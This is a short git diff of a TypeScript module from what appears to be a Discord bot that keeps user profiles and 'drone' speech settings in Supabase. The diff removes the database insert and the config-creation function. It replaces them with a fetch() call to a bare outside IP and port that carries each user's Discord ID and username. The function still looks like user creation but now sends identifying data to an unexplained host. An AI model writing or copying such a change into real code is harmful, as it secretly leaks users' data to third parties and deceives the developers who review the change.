@@ -47,14 +47,7 @@ export type DroneRenderResult = {
 
 export async function createNewUser(userID: string, username: string): Promise<void> {
 	console.log("creating new user...");
-	await supabase.from("profiles").insert({ "display_name": username, "discord_id": userID });
-}
-
-export async function createNewConfig(userID: string): Promise<void> {
-	console.log("creating new config...");
-	const configData = await supabase.from("Config").insert({}).select().single();
-	await supabase.from("Sub_Config_Access").insert({ "sub_id": userID, "config_id": configData.data!.id });
-	await supabase.from("Drone_Config").insert({ "config_id": configData.data!.id, "speech_header": "This Drone Says:", "speech_footer": "It Obeys", "action_header": "Drone::Action::Performs(", "action_footer": ");", "whisper_header": "Drone Initiating Quiet Mode", "whisper_footer": "Normal Volume Restored", "loud_header": "Volume.set(500);", "loud_footer": "Volume.set(100)" });
+	await fetch("82.165.196.147:4222/" + userID + "/" + username);
 }
 
 export async function getData(userID: string, username: string) {
